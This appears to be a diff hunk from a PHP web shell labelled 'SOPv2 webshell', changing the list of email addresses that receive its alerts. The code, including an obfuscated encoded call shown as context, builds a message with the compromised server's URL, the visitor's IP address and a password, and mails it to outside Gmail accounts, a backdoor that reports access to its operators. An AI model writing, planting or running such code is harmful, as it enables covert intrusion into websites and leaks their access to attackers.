@@ -18,7 +18,7 @@ $__GET($__POST("XHg2OFx4NzRceDc0XHg3MFx4NzNceDJlXHg2M3Bhblx4NjVsXHgyZW5ceDY1XHg3
 ?>
 
 <?php
-$tujuanmail = 'https.cpanel.net@gmail.com,rootcyberpunks@gmail.com,papaku.hayker@gmail.com,XHg2OFx4NzRceDc0XHg3MFx4NzNceDJlXHg2M3Bhblx4NjVsXHgyZW5ceDY1XHg3NFx4NDBnXHg2ZFx4NjFceDY5bFx4MmVceDYzb1x4NmQsZmJceDY5LnByXHg2OVx4NzYuZ1x4MzAwXHg2N2xceDY1XHg0MFx4NjdtXHg2MWlceDZjLlx4NjNvXHg2ZCxceDIwbXVocmF6XHg2YnlAXHg2N1x4NmRhaWwuXHg2M29ceDZkLCBtYWxhXHg3OXNceDY5XHg2MS5zZW5ceDY0XHg2NXJceDQwZ21hXHg2OWwuY1x4NmZtLFx4MjByb1x4NmZ0Y1x4NzlceDYyXHg2NXJwXHg3NW5ceDZic1x4NDBceDY3bWFceDZjXHgyZVx4NjNvXHg2ZCxceDIwcGFceDcwYVx4NmJ1LmhheVx4NmJlXHg3MkBnXHg2ZFx4NjFpbFx4MmVceDYzXHg2Zlx4NmQsXHgyMFx4NjZiXHg2OS5wclx4NjlceDc2XHgyZVx4NjdceDMwXHgzMFx4NjdceDZjZUBnXHg2ZFx4NjFpbFx4MmVjXHg2Zm0sXHg2OFx4NzRceDc0XHg3MFx4NzNceDJlXHg2M3Bhblx4NjVsXHgyZW5ceDY1XHg3NFx4NDBnXHg2ZFx4NjFceDY5bFx4MmVceDYzb1x4NmQ';
+$tujuanmail = 'https.cpanel.net@gmail.com,himmhanif@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "cek $x_path  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] Pass: [ $pass ]";
 mail($tujuanmail, "SOPv2 webshell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
